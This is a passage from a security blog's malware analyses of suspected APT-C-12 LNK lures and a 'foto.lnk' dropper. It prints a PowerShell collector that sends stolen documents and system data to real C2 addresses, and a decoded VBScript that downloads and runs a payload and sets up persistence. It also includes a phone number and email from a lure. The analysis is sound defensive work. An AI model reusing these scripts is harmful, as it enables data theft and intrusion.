'*:\\ProgramData' -and $_.fullname -notlike '*:\\MSOCache' -and $_.fullname -notlike '*:\\PerfLogs' -and $_.fullname -notlike '*:\\System Volume*' -and $_.fullname -notlike '*:\\Documents and Settings' -and $_.fullname -notlike '*:\\Recovery' -and $_.fullname -notlike '*:\\Boot'}; $5=$5 | sort lastwritetime -des | % {$_.fullname} | ? {$_}; $e+=\"Search List:`r`n$5`r`n\"; $c=0; If ($6 -ge 30){ $r=30 } Else { $r=$6 } $p=Get-Date; $k=1; $n=0; while ($6 -ge $r) { $e+=\"M $k (D $c - D $r):`r`n\"; foreach ($d in (('.doc','.docx','.pdf'),('.ppt','.pptx','.xls','.xlsx','.wps','.wpp','.et'),('.txt','.eml'))) { $e+=\"FileType: $d`r`n\"; foreach ($4 in $5) { Try { gci $4 -r -fo -errora silentlycontinue | ? {$d -contains $_.extension -and $_.LastWriteTime -lt $p.AddDays(-1*$c) -and $_.LastWriteTime -ge $p.AddDays(-1*$r) } | % {$b+=1;$e+=zm7 $_ $n $b $y $x;$n=$_.Length; If ($e.endswith(\"OK`r`n\")) { $y+=1 } } } catch { $e+=\"[!!!$4 search error !!!]`r`n\" } } } $e+=(Get-Date -f yyyyMMddhhmmss)+\"`r`n\"; $e+=(get-wmiobject win32_process -f \"name='powershell.exe'\" | % {$_.commandline+\"`r`n\"}); $e  \"$env:tmp\\$($k)test.txt\"; $e=\"$env:tmp\\$($k)test.txt\"; x56 $j \"$env:tmp\\backups\\M$k.rar\" $e; ts3 (gi -fo \"$env:tmp\\backups\\M$k.rar\") $x \"M$k\"; del -fo $e,\"$env:tmp\\backups\\M$k.rar\"; $e=''; If ($6 -le $r) { break } $r+=30; $c+=30; If ($6 -le $r) { $r=$6 } $k+=1 } $p=0; $k=0; while(1) { sleep -s 3500; md -fo \"$env:tmp\\backups\"; $x=(hostname)+\"_P\"+(Get-Date -f yyyyMMddhhmmss)+\"_REDACTED\"; $y=1;$n=0;$k+=1;$e=\"$x`r`n\"; gci \"$env:appdata\\Microsoft\\Windows\\Recent\\\" -fo -errora silentlycontinue | ? {$f -contains [io.path]::getextension($_.basename) -and $_.LastWriteTime -ge (Get-Date).AddHours(-1) } | % {gi ((new-object -com wscript.shell).createshortcut($_.fullname)).targetpath -fo -errora silentlycontinue} | % {$b+=1;$e+=zm7 $_ $n $b $y $x;$n=$_.Length; If ($e.endswith(\"OK`r`n\")) { $y+=1 } }; $f=''; $e+=(Get-Date -f yyyyMMddhhmmss)+\"`r`n\"; $e  \"$env:tmp\\$($k)test.txt\"; $e=\"$env:tmp\\$($k)test.txt\"; x56 $j \"$env:tmp\\backups\\P$k.rar\" $e; ts3 (gi -fo \"$env:tmp\\backups\\P$k.rar\") $x \"P$k\"; del -fo $e,\"$env:tmp\\backups\\P$k.rar\" } } [System.Net.ServicePointManager]::DefaultConnectionLimit=50;[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; $s=(hostname)+\"_\"+(Get-Date -f yyyyMMddhhmmss)+\"_REDACTED\"; $m='http://159.65.74.97;http://159.65.127.93;http://128.199.73.43'; $p=$m.split(\";\"); $q=$p.length; $l=0; $w=\"\"; while ($l -lt $q) { try { $9=[System.Net.WebRequest]::Create($p[$l]); $w+=$l.ToString(); $3=$9.GetResponse(); $w+=\" OK`r`n\" } catch { $w+=\" BAD!`r`n\" } $l+=1 } $w+=(Get-Date -f yyyyMMddhhmmss)+\"`r`n\"; $w+=\"systeminfo:`r`n\"+(systeminfo)+\"`r`n\"; $w+=\"ipconfig /all:`r`n\"+(ipconfig /all)+\"`r`n\"; $w+=\"netstat -a:`r`n\"+(netstat -a)+\"`r`n\"; $w+=\"arp -a:`r`n\"+(arp -a)+\"`r`n\"; $w+=\"desktop files:`r`n\"+(ls -r $home\\desktop)+\"`r`n\";$w+=\"tmp files:`r`n\"+(ls $env:tmp\\..\\)+\"`r`n\";$w+=\"pw cmd:`r`n\"+(get-wmiobject win32_process -f \"name='powershell.exe'\" | % {$_.commandline+\"`r`n\"}); $w+=\"programfiles:`r`n\"+(ls $env:programfiles)+\"`r`n\"; $w+=\"programfiles x86:`r`n\"+(ls ${env:programfiles(x86)})+\"`r`n\"; $w+=(Get-Date -f yyyyMMddhhmmss)+\"`r`n\"; $w | out-file \"$env:tmp\\start.log\" -Encoding UTF8; $3=-join([char[]](48..57+65..90+97..122) | get-random -c 16); $7=new-object security.cryptography.rsacryptoserviceprovider(2048); $7.fromxmlstring(\"4RKDLymbgSDghM7HHxZprfPfWcoBQDCL156NPOAsDRiLZ57zj8kcqjq/zgGFAuyhmfmaFBCRz75NIN33Ze105pNzOZXAO975/IpS4xNimVA7vmeEEAF7JQ+W3JMNnzXM5Tx1aMyiaSVY3k+07H45hPEiAJx07f/f94EDwTBNkhL3RN1B30+B75d/6sjn+T4u3bkZEx88LLwRQEQf/wO3Ey0OaH1i04prS6HC6R63XRPNCBYWUzDcTFYLidwqNBfBzwMRsPIoLdmav4BOdVNIubPhCINzT6FcaFyYB9kHsDXEM8o+Tou9eNhIBE1koJ9qjhGBFi+s20Sj3qE4mv8kpw==AQAB\"); $7.encrypt([text.encoding]::utf8.getbytes(\"$3\"),$False)  \"$env:tmp\\id\"; iex (\"\u0026 '$env:AppData\\WinRAR\\Rar.exe' a -ep1 -y '$env:tmp\\id.rar' '$env:tmp\\id'\")|out-null; while(!(ts3 (gi \"$env:tmp\\id.rar\") $s 'id')){sleep -s 180}x56 $3 \"$env:tmp\\start.rar\" \"$env:tmp\\start.log\"; ts3 (gi \"$env:tmp\\start.rar\") $s 'start'; del -fo \"$env:tmp\\id\",\"$env:tmp\\id.rar\",\"$env:tmp\\start.rar\",\"$env:tmp\\start.log\"; sr2 $3 $s  The PowerShell scripts do vary between the samples, but maintain the same key features. Some have blocks of Base64 to obfuscate the calling of the DLL, while others have this code in the clear. Additionally, the PowerShell script passed as a parameter with the DLL does vary slightly.\nBut at a very high level, the PowerShell extracts out more data from the LNK file, expands that data into a temporary location, loads a malicious dll (with a further PowerShell script as a parameter), obtain user information and data, and encrypts it before sending it back to a C2 server. The 360 TIC report examines this code in depth.\nTo me, however, what stood out was a string which I have redacted2 appended to the collected data, which could refer to a username or social media handle to identify the origin of returned data.\n Looking at the other LNK samples more of these handle-type names were identified. Of these I was able to identify a social media account for at least two of these type of strings in the samples:\nSummary of all the key IOCs from the PowerShell identifies possible handles and C2 infrastructure:\nIdentifying StringSHA 256 HashIP AddressesStorage ServerUser AgentOtherString 120ad6fa72982a6ba0f9499361b2aa3a3\nf5cca73fd397c2969d08a4c5f2866814159.65.127.93\n139.59.238.1\n138.197.142.2360123.nyc3.digitaloceanspaces.comMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA) Chrome/62.0.3202.94 Safari/.36Embedded Base64 to execute DLLString 2b0d7118d75c0f2a99fa5b319148b8914\n8800e5db06ee403d6a31c451a8a54f2b139.59.226.29\n188.226.144.42\n139.59.230.1810123.nyc3.digitaloceanspaces.comMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA) Chrome/62.0.3202.94 Safari/.36Embedded Base64 to execute DLLString 370b6961af57bce72b89103197c8897a4\nae3ce5fdb835ccd050f24acbac52900d159.65.74.97\n159.65.127.93\n128.199.73.43\n05012.ams3.digitaloceanspaces.comMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA) Chrome/62.0.3202.94 Safari/.36String 1ea6e7c9b9110c7c21062908be51dd3f8\n81490b40b9b77a534fdc7812ab5cd2af159.65.127.93\n139.59.238.1\n138.197.142.2360123.nyc3.digitaloceanspaces.comMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA) Chrome/62.0.3202.94 Safari/.36Embedded Base64 to execute DLLString 46ccad83fb9f7a50ac95e3e865a27be0\n288279e76fcd3b5af495c6fcf6d58fa36178.128.110.214\n198.211.118.118\n138.197.135.170\n59.73.16.165\nN/AMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like DA) Chrome/62.0.3202.94 Safari/.36Using FTP server rather than Digital Ocean Hey Taxi!! Cab!! The PowerShell further extracted a CAB file that contained further files: PDFs, DOCXs, DOCs, and JPEGs along with a DLL with a non-standard extension (e.g. .g), and a legitimate copy of rar.exe. The dropped files (sans the .dll, see below) are:\nString of Interest #LNK File NameDropped FilesTranslated Dropped FilesSHA256 HashesString 1陈婧简历+作品.lnk《互联网发展：信息与动态》7月刊原稿.docx\n《中国工商报》官方微博作品.docx\n陈婧+13957937111+简历.doc\"Internet Development: Information and Development\" July Issue.docx\n\"China Business News\" official Weibo works.docx\nChen Jing + 13957937111 + resume.docca1aea9710219b68fe30b964a526dc82efa08d9032959efd252f7197af1deb21\n1a7c9ac35f4c89fe4906ee1c512c2fc5306d8d97d7ab44cc7726475923a311f1\nfac0bfb2aedea0fde6e4f239cbfd4de9d8db55e6041cf3f62956b2dc50620506String 2周文重：2018博鳌亚洲论坛感谢函.lnk周文重：2018博鳌亚洲论坛感谢函.docZhou Wenzhong: Thank you letter for Boao Forum for Asia 2018.doc32b3c6920eb5fcd8bddf55154e6e17453a4f07919216e7df6d84fb3f57a64966String 3【2018前海合作论坛】.lnk附件1-2018前海合作论坛方案.pdf\n附件2-参会回执.docx\n附件3-深圳市前海香港商会简介.pdf2018前海合作论坛邀请函.pdfAnnex 1-2018 Qianhai Cooperation Forum Program.pdf\nAnnex 2-Participation Receipt.docx\nAttachment-3-Brief introduction of Shenzhen Qianhai Hong Kong Chamber of Commerce.pdf\n2018 Qianhai Cooperation Forum Invitation Letter.pdf94aa26bac896f65cfebbb76efa9b7009c658e01e2d52d2da338483c3fb5f3188\n52384bf0f4e694eb030a31f82b74e4fdcb261e11ede4fefa3cc5f2782bdd370b\nf600c66bc52c84698fb52a1f12d2f50fbe3b64754b226e8adb65f0b44a831dc8\n091880728698db599e2b577d629d3bc6c9a9b40370f3ce0b9943cee8cbf20302String 1《政法网络舆情》会员申请.lnk《政法网络舆情》会员征集函.doc\n婺城分局祝您鸡年行大运-1.jpg\n婺城分局祝您鸡年行大运-2.jpg\n婺城分局祝您鸡年行大运-3.jpg\n婺城分局祝您鸡年行大运-4.jpg\n婺城分局祝您鸡年行大运-5.jpg\n婺城分局祝您鸡年行大运-6.jpg\"Politics and Law Network Public Opinion\" Membership Letter.doc\nTancheng Branch wishes you a good luck in the Year of the Rooster-1.jpg\nTancheng Branch wishes you a good luck in the Year of the Rooster-2.jpg\nTancheng Branch wishes you a good luck in the Year of the Rooster-3.jpg\nTancheng Branch wishes you a good luck in the Year of the Rooster-4.jpg\nTancheng Branch wishes you a good luck in the Year of the Rooster-5.jpg\nTancheng Branch wishes you a good luck in the Year of the Rooster-6.jpgab0b6e3a24a4b9f102a58b8536f68ddd560e8b42c16652b9db388ef981bbf165\nf6ca0e0bb33163143867bb496f53a6f329a927c06af0c0ddc9506d3c3fd3d335\n6fb39753349dd8811270be863b61d0d42120c3452b8b09964e3e6c1d3ab21b7b\n7dc76e3c60fac07d61d6dd183624458cf982b25121bcd6a26090365b0bb089d5\n8297b9d4f7f0ffb7a8fa99d5cfe93818cb23ddbd99722dbba59e58fab27a86b9\n687535ba02c808d795f4893962f0d9b650cea8df40d1de80ea095befe0064b91\nb787ff47b1db14409c5524e4bc5f763e3eb5cec3cf34aa553f2b41501e955737String 4《观察者网》采访提纲暨相关新闻附件.lnk《观察者网》采访提纲.docx\n蔡英文接受法新社专访问答全文.docx\n美“友台派”议员又作妖，提“2018年台湾国际参与法案”.docx\n美参议员望通过新法案 倡议加强美与亚洲多方面长期合作.docx\n美议员鼓动特朗普抛弃“一中”政策与台湾“复交”,专家可能性微乎其微.docx\"Observer.com\" Interview Outline.docx\nTsai Ing-wen accepted the full text of the AFP interview.docx\nUS \"Taiwanese\" MPs have made a demon again, mentioning \"Taiwan International Participation Act of 2018\" .docx\nU.S. Senators hope to pass new bill initiative to strengthen long-term cooperation between the United States and Asia.docx\nU.S. lawmakers urge Trump to abandon \"one China\" policy and \"return diplomatic relations\" with Taiwan, experts are extremely unlikely.docx0ad09b21b36ddbaa24653953181cc092400eb992aac329bde58952b96dc0aa9d\n140e069093b42d9044c8ccc53cef1b3b0226248b9d7302eb64dcdf92256fa204\ne53bfb8826d20be3fc043a08c733221bddc2e1ba394bef9d40144c862ccf377f\n283f88c50234a4b3961384c85124c52878ab6af4801cbc0c86a3e1d779c1c48f\nafe2f381bf7bcb9309db216a3f956dbf05c70da9bce9dcdcabde7ef0c46c01c9 At this stage, I haven\u0026rsquo;t done any analysis on these 20 files, except basic metadata checks. Of possible interest is the file 陈婧+13957937111+简历.doc has the email address chenjingo662@sina.com embedded as a hyperlink.\nDLLs The five DLLs have similar characteristics. All are masquerading as a NVIDIA dll file with similar matadata as below:\n A check of relevant hashes indicates three samples are the same, and the other two are different; however, have a recorded compilation time within 12 seconds of each other.\nIdentifying StringDLL filenameSHA 256 HashImpHashCompilation TimeString 4SwYLR.Ta76cb406145b1e094a8ec46ae0cf9594\n95bfa4aa19ccf6b48353cc459c00005b9442FCDB7DAAB60B53A67D5A419F71F3compiler-stamp: Thu May 31 23:06:58 2018\ndebugger-stamp: Thu May 31 23:06:58 2018\nString 1lyNMk.vf9ee8f1ca51475397e2c190290c0aeb7\n4a9f8a36bc0b6dfb500af7ca47d45daa6F5C40C66163B6F9E9E406E6AB83E3CCcompiler-stamp: Wed Feb 07 22:04:01 2018\ndebugger-stamp: Wed Feb 07 22:04:01 2018\nString 3FLrzH.w92ad7532f7b6cb5b6812da586ae9c2c6\nddf65de38aebf4067853968be20e72a28E02074B51513C018F9B73FEB0BEC905compiler-stamp: Thu May 31 23:07:10 2018\ndebugger-stamp: Thu May 31 23:07:10 2018\nString 2hxCEm.Gf9ee8f1ca51475397e2c190290c0aeb7\n4a9f8a36bc0b6dfb500af7ca47d45daa6F5C40C66163B6F9E9E406E6AB83E3CCcompiler-stamp: Wed Feb 07 22:04:01 2018\ndebugger-stamp: Wed Feb 07 22:04:01 2018\nString 1beoql.gf9ee8f1ca51475397e2c190290c0aeb7\n4a9f8a36bc0b6dfb500af7ca47d45daa6F5C40C66163B6F9E9E406E6AB83E3CCcompiler-stamp: Wed Feb 07 22:04:01 2018\ndebugger-stamp: Wed Feb 07 22:04:01 2018\n The files lyNMk.v, hxCEm.G and beoql.g with SHA256 f9ee8f1ca51475397e2c190290c0aeb74a9f8a36bc0b6dfb500af7ca47d45daa were recorded on Virus Total (35/67) with a first submission date of 2018-04-26 10:14:33 and had the recorded alternative names as nvapisetlib, 96d9fd90e180aaf435c21334858654f6.vir (Norton AV) and beoql.g. The other two files were not recorded by that hash on Virus Total.\nA rough timeline (if all the dates and times are believed):\n 2018-02-07: Compilation Date of DLL sample f9ee8f1ca51475397e2c190290c0aeb74a9f8a36bc0b6dfb500af7ca47d45daa 2018-04-26: First Submission to VT of DLL sample f9ee8f1ca51475397e2c190290c0aeb74a9f8a36bc0b6dfb500af7ca47d45daa 2018-05-31: Compilation Date of DLL samples 92ad7532f7b6cb5b6812da586ae9c2c6ddf65de38aebf4067853968be20e72a2 and a76cb406145b1e094a8ec46ae0cf959495bfa4aa19ccf6b48353cc459c00005b 2018-07-12: 360 TIC report 2018-10-28: Last Submission of DLL sample f9ee8f1ca51475397e2c190290c0aeb74a9f8a36bc0b6dfb500af7ca47d45daa to VT 2019-10-29: Submission to Hybrid-Analysis of five LNK samples 2019-10-29: Submission to Virus Total of only one LNK sample: 70b6961af57bce72b89103197c8897a4ae3ce5fdb835ccd050f24acbac52900d  The APT Link to the LNKs Googling key elements of the above malware samples, led me to the abovementioned report by 360 TIC who detailed the exact campaign for only one of the files (ostensibly sample SHA256 ea6e7c9b9110c7c21062908be51dd3f881490b40b9b77a534fdc7812ab5cd2af). Their report is extensive, and looks at the DLL dropped and its later actions and persistence.\nHowever, it is clear the samples were part of a campaign, and two of the files I can very tentatively associate to an online account. One identified social media account has limited use, and is linked to other accounts associated with the Hong Kong democracy movement. The second account has not been active since 2012 but posted information relating to Chinese corruption and apparent unauthorised detentions by the Chinese state.\nHowever, there needs to be further information before any conclusion can be made as to the purpose of these strings.\nIf my hypothesis is correct then each malware sample was customised to include the suffix of a known identifier for the target. This likely means that the attacker did not know much about the target (i.e. end infrastructure they would potentially compromise).\nIntelligence Gaps There are significant intelligence gaps that require either deeper analysis on the samples or further external information:\n Why were the samples uploaded now, and en-mass? Are the suspicious string suffixes related to targets? Or are they used as reference to accounts controlled by the attacker? Or unrelated at all. At least one sample is likely dated from the original 360 TIC report meaning that it was around mid-2018. What is the relationship of this sample to the others?  Conclusion There is a bunch of further analysis to be done: including on the DLLs and the other extracted files from the malicious CAB files. This post is initially seeking to put the files out there, and share the comparisons between them.\nI\u0026rsquo;ll reiterate at this time that the \u0026lsquo;attribution\u0026rsquo; to the Sapphire Mushroom group is not mine, and solely based on previous reporting and the high likelihood these samples are from the same campaign.\nIf you have more information, questions, or analysis feel free to hit me up on Twitter or via email at matt@bitofhex.com. Thanks for reading!\n  All Chinese-language text has been lovingly translated by Google Translate. I apologise for any errors. \u0026#x21a9;\u0026#xfe0e;\n I have chosen to redact the strings themselves and instead refer to them as STRING 1 - 4. \u0026#x21a9;\u0026#xfe0e;\n   ","id":1,"section":"posts","summary":"In July 2018, the Chinese-based research group 360 Technical Intelligence Center (TIC) produced a report \u0026ldquo;蓝宝菇（APT-C-12）针对性攻击技术细节揭秘\u0026rdquo; (Sapphire Mushroom (APT-C-12) Technical Details Revealed1). This report analysed a malicious LNK file allegedly used by the","tags":["lnk files","cyberchef","malware","threat intelligence","apt"],"title":"Suspected Sapphire Mushroom (APT-C-12) malicious LNK files","uri":"https://bitofhex.com/2020/02/10/sapphire-mushroom-lnk-files/","year":"2020"},{"content":"In Australia, a platypus is colloquially called the \u0026lsquo;spare parts animal\u0026rsquo;. It\u0026rsquo;s an egg-laying mammal, with a duck bill, beaver tail and webbed feet. It\u0026rsquo;s perfectly adapted to its environment despite looking like a Frankenstien of the animal world.\nWhat does this have to do with a malicious LNK file? Well, apart from the fact I like platypuses (or is it platypi?), malware using LNK files stitch together the world between the attacker and the victim. These \u0026lsquo;toolmarks\u0026rsquo; have been written by myself and more extensively here. So that\u0026rsquo;s why I keep coming back to looking at them.\nAdditionally, this random sample from Hybrid-Analysis, foto.lnk, is also a bit of a Frankenstien of a malware: stitched together with various components that we shall examine. It\u0026rsquo;s not a ground-breaking, born of an APT 1, or ingenious. But still is interesting to deconstruct. So, without wasting any more time on Australian monotremes, let\u0026rsquo;s dive in an take a look!\nFoto.lnk The file, foto.lnk (SHA256: D28C1C4F4C705B21E84ADADB42594E42543DF4F1C4B44219569DC18B375E78E3) appears as a normal LNK file. Of course, the target executes PowerShell via cmd.exe rather than launch a program:\n The full code executed is as follows:\nC:\\Windows\\System32\\cmd.exe /c start \"\" explorer \"%cd%\\Foto\" | powershell -NonInteractive -noLogo -c \"\u0026 {get-content %cd%\\Foto.lnk | select -Last 1  %appdata%\\_.vbe}\" \u0026\u0026 start \"\" wscript //B \"%appdata%\\_.vbe\"  This command will execute PowerShell Get-Content to write the last line of the LNK file to another file: C:\\Users\\\u0026lt;account\u0026gt;\\AppData\\Roaming\\_.vbe. In this case, the LNK file (perhaps we should now say Frankenlnk?) is carrying the second payload: an encoded Visual Basic file. Shifting to the end of the file where the PowerShell is copying data from, the encoded contents can be seen starting with #@~ and ending with ^#~@.\n _.VBE VBE files are a legitimate way for developers to obfuscate their scripts to protect their intellectual property. See here for a great run-down on VBE malware. Using Didier Stevens\u0026rsquo; tool decode-vbe.py the obfuscated output becomes:\nfunction DF353449CC6DEB35002E2EC(BBFD5FC89F398A9E08E6734) for AC3DC0C68330AD3CCBCC207 = 1 to len(BBFD5FC89F398A9E08E6734) Step 2 DF353449CC6DEB35002E2EC = DF353449CC6DEB35002E2EC \u0026 Chr(int(\"\u0026H\"\u0026mid(BBFD5FC89F398A9E08E6734,AC3DC0C68330AD3CCBCC207,2))) next End Function On Error Resume Next Set CCF1828B74279597728A = CreateObject(DF353449CC6DEB35002E2EC(\"577363726970742E5368656C6C\")) Set FE60A4152AFF46A3BE9403F=CreateObject(DF353449CC6DEB35002E2EC(\"536372697074696E672E46696C6553797374656D4F626A656374\")) CB2DFC0272FBAFE74128D43 = DF353449CC6DEB35002E2EC(\"636C69656E74\") BBB6B994ABBEC7719177C4A = DF353449CC6DEB35002E2EC(\"636C69656E742E707331\") FBD652DA231F93648EE5FF1 = CCF1828B74279597728A.ExpandEnvironmentStrings(DF353449CC6DEB35002E2EC(\"257573657270726F66\")\u0026DF353449CC6DEB35002E2EC(\"696C6525\"))\u0026DF353449CC6DEB35002E2EC(\"5C417070446174615C526F616D696E675C4D6963726F736F66745C57696E646F77735C5374617274204D656E755C50726F6772616D735C537461727475705C2E6C6E6B\") FF2CF9DFB02A68243C7A007 = CCF1828B74279597728A.ExpandEnvironmentStrings(DF353449CC6DEB35002E2EC(\"25757365\")\u0026DF353449CC6DEB35002E2EC(\"7270726F66696C6525\") \u0026 DF353449CC6DEB35002E2EC(\"5C53595354454D\")) EEF7DC408D6E68E06D9C2F9 = DF353449CC6DEB35002E2EC(\"68747470733A2F2F7A777169702E6D6C2F3435373137\") AF954113B32AED10916E1A7 = chr(34) BF478F231C1E9460F79BB4E = DF353449CC6DEB35002E2EC(\"706F7765727368656C6C202D6E6F4C6F676F202D4E6F6E496E746572616374697665202D6320\")\u0026AF954113B32AED10916E1A7\u0026DF353449CC6DEB35002E2EC(\"267B284E65772D4F626A656374204E65742E576562436C69656E74292E446F776E6C6F616446696C652827\") \u0026 EEF7DC408D6E68E06D9C2F9 \u0026 DF353449CC6DEB35002E2EC(\"272C24656E763A7573657270726F66696C652B275C\") \u0026 CB2DFC0272FBAFE74128D43 \u0026 DF353449CC6DEB35002E2EC(\"27293B7D\")\u0026AF954113B32AED10916E1A7 ABF02819764175C48EFC73A = DF353449CC6DEB35002E2EC(\"657870616E6420\")\u0026AF954113B32AED10916E1A7\u0026DF353449CC6DEB35002E2EC(\"25757365727072\")\u0026DF353449CC6DEB35002E2EC(\"6F66696C65255C\")\u0026 CB2DFC0272FBAFE74128D43 \u0026AF954113B32AED10916E1A7\u0026DF353449CC6DEB35002E2EC(\"20\")\u0026AF954113B32AED10916E1A7\u0026DF353449CC6DEB35002E2EC(\"25757365727072\")\u0026DF353449CC6DEB35002E2EC(\"6F66696C65255C\")\u0026BBB6B994ABBEC7719177C4A\u0026AF954113B32AED10916E1A7 FD9EEE6B396C96EF57FA0D8 = DF353449CC6DEB35002E2EC(\"706F7765727368656C6C202D6E6F4C6F676F202D4E6F6E496E746572616374697665202D457865637574696F6E506F6C6963792042797061737320202D6320\")\u0026AF954113B32AED10916E1A7\u0026DF353449CC6DEB35002E2EC(\"696E766F6B652D65787072657373696F6E2024656E763A7573657270726F66696C65275C\")\u0026BBB6B994ABBEC7719177C4A\u0026DF353449CC6DEB35002E2EC(\"27\")\u0026AF954113B32AED10916E1A7 BDE45D751DE0BB087449910 = DF353449CC6DEB35002E2EC(\"617474726962202B68202B73202B7220\")\u0026AF954113B32AED10916E1A7\u0026CCF1828B74279597728A.ExpandEnvironmentStrings(DF353449CC6DEB35002E2EC(\"257573657270\")\u0026DF353449CC6DEB35002E2EC(\"726F66696C6525\"))\u0026DF353449CC6DEB35002E2EC(\"5C\")\u0026BBB6B994ABBEC7719177C4A\u0026AF954113B32AED10916E1A7 BC5AFC96DE5641F3DF61FB9 = DF353449CC6DEB35002E2EC(\"636D64202F632064656C202F66202F7320\")\u0026AF954113B32AED10916E1A7\u0026CCF1828B74279597728A.ExpandEnvironmentStrings(DF353449CC6DEB35002E2EC(\"257573657270726F66\")\u0026DF353449CC6DEB35002E2EC(\"696C6525\")) \u0026 DF353449CC6DEB35002E2EC(\"5C\")\u0026CB2DFC0272FBAFE74128D43\u0026AF954113B32AED10916E1A7 CCF1828B74279597728A.Run BF478F231C1E9460F79BB4E,0,True CCF1828B74279597728A.Run ABF02819764175C48EFC73A,0,True CCF1828B74279597728A.Run BDE45D751DE0BB087449910,0,True CCF1828B74279597728A.Run BC5AFC96DE5641F3DF61FB9,0 AA2B5C8CB1A3A5A94A986C2 = FF2CF9DFB02A68243C7A007 Set AF0D10F083F00C234B4F60A = FE60A4152AFF46A3BE9403F.CreateTextFile(AA2B5C8CB1A3A5A94A986C2,True) AF0D10F083F00C234B4F60A.Write DF353449CC6DEB35002E2EC(\"44696D207368656C6C2C636F6D6D616E64\") \u0026 vbCrLf AF0D10F083F00C234B4F60A.Write DF353449CC6DEB35002E2EC(\"536574207368656C6C203D204372656174654F626A65637428\")\u0026AF954113B32AED10916E1A7\u0026DF353449CC6DEB35002E2EC(\"577363726970742E5368656C6C\")\u0026AF954113B32AED10916E1A7\u0026DF353449CC6DEB35002E2EC(\"29\") \u0026 vbCrLf AF0D10F083F00C234B4F60A.Write DF353449CC6DEB35002E2EC(\"636F6D6D616E64203D20\")\u0026AF954113B32AED10916E1A7\u0026DF353449CC6DEB35002E2EC(\"706F7765727368656C6C202D6E6F4C6F676F202D4E6F6E496E746572616374697665202D457865637574696F6E506F6C6963792042797061737320202D6320\")\u0026AF954113B32AED10916E1A7\u0026AF954113B32AED10916E1A7\u0026DF353449CC6DEB35002E2EC(\"696E766F6B652D65787072657373696F6E2024656E763A7573657270726F66696C65275C\") \u0026 BBB6B994ABBEC7719177C4A \u0026 DF353449CC6DEB35002E2EC(\"27\")\u0026AF954113B32AED10916E1A7\u0026AF954113B32AED10916E1A7\u0026AF954113B32AED10916E1A7\u0026vbCrLf AF0D10F083F00C234B4F60A.Write DF353449CC6DEB35002E2EC(\"7368656C6C2E52756E20636F6D6D616E642C30\") AF0D10F083F00C234B4F60A.Close Set AF0D10F083F00C234B4F60A = Nothing Set AF0D10F083F00C234B4F60A = FE60A4152AFF46A3BE9403F.GetFile(AA2B5C8CB1A3A5A94A986C2) AF0D10F083F00C234B4F60A.Attributes = 7 Set AF0D10F083F00C234B4F60A = Nothing Set BA06C14AA13C53E7C9AF076 = CCF1828B74279597728A.CreateShortcut(FBD652DA231F93648EE5FF1) BA06C14AA13C53E7C9AF076.TargetPath = CCF1828B74279597728A.ExpandEnvironmentStrings(DF353449CC6DEB35002E2EC(\"257379737465\")\u0026DF353449CC6DEB35002E2EC(\"6D647269766525\")) \u0026 DF353449CC6DEB35002E2EC(\"5C57696E646F77735C53797374656D33325C636D642E657865\") BA06C14AA13C53E7C9AF076.Arguments = DF353449CC6DEB35002E2EC(\"2F632077736372697074202F2F42202F2F453A76627320257573\")\u0026DF353449CC6DEB35002E2EC(\"657270726F66696C65255C53595354454D\") BA06C14AA13C53E7C9AF076.IconLocation = CCF1828B74279597728A.ExpandEnvironmentStrings(DF353449CC6DEB35002E2EC(\"2573797374656D64\")\u0026DF353449CC6DEB35002E2EC(\"7269766525\")) \u0026 DF353449CC6DEB35002E2EC(\"5C57696E646F77735C53797374656D33325C5368656C6C33322E646C6C2C34\") BA06C14AA13C53E7C9AF076.WindowStyle = DF353449CC6DEB35002E2EC(\"37\") BA06C14AA13C53E7C9AF076.WorkingDirectory = DF353449CC6DEB35002E2EC(\"2543\")\u0026DF353449CC6DEB35002E2EC(\"4425\") BA06C14AA13C53E7C9AF076.Save Set BA06C14AA13C53E7C9AF076 = Nothing Set CB7D9146496BF22F697EB8F = FE60A4152AFF46A3BE9403F.GetFile(FBD652DA231F93648EE5FF1) CB7D9146496BF22F697EB8F.Attributes = 6 Set CB7D9146496BF22F697EB8F = Nothing CCF1828B74279597728A.RegWrite DF353449CC6DEB35002E2EC(\"484B43555C536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E5C\"),AF954113B32AED10916E1A7\u0026FBD652DA231F93648EE5FF1\u0026AF954113B32AED10916E1A7,DF353449CC6DEB35002E2EC(\"5245475F535A\") CCF1828B74279597728A.Run FD9EEE6B396C96EF57FA0D8,0  Ugh.\nFor someone like me who doesn\u0026rsquo;t know a whole lot of Visual Basic this looks painful. But\u0026hellip;looking at the code I can see hexadecimal values in the quotes. It would be remiss of a blog called \u0026lsquo;bit_of_hex\u0026rsquo; not to extract those and see what they are. Of course, CyberChef to the rescue:\nRegular_expression('User defined','\\\\(\".*?\"\\\\)',true,false,false,false,false,false,'List matches') Find_/_Replace({'option':'Simple string','string':'(\"'},'',true,false,true,false) Find_/_Replace({'option':'Simple string','string':'\")'},'',true,false,true,false) Fork('\\\\n','\\\\n',false) From_Hex('Auto')  The power of this CyberChef recipe is the regular expression \\(\u0026quot;.*?\u0026quot;\\). This will extract everything in bracketed quotes to the first end quote/bracket. Using the CyberChef \u0026lsquo;highlight regex\u0026rsquo; function the result can be previewed before committing:\n From there, it\u0026rsquo;s a simple find/replace, and convert from hexadecimal to get the following output of strings:\nWscript.Shell Scripting.FileSystemObject client client.ps1 %userprof ile% \\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\.lnk %use rprofile% \\SYSTEM hxxps://zwqip.ml/45717 powershell -noLogo -NonInteractive -c \u0026{(New-Object Net.WebClient).DownloadFile(' ',$env:userprofile+'\\ ');} expand %userpr ofile%\\ %userpr ofile%\\ powershell -noLogo -NonInteractive -ExecutionPolicy Bypass -c invoke-expression $env:userprofile'\\ ' attrib +h +s +r %userp rofile% \\ cmd /c del /f /s %userprof ile% \\ Dim shell,command Set shell = CreateObject( Wscript.Shell ) command = powershell -noLogo -NonInteractive -ExecutionPolicy Bypass -c invoke-expression $env:userprofile'\\ ' shell.Run command,0 %syste mdrive% \\Windows\\System32\\cmd.exe /c wscript //B //E:vbs %us 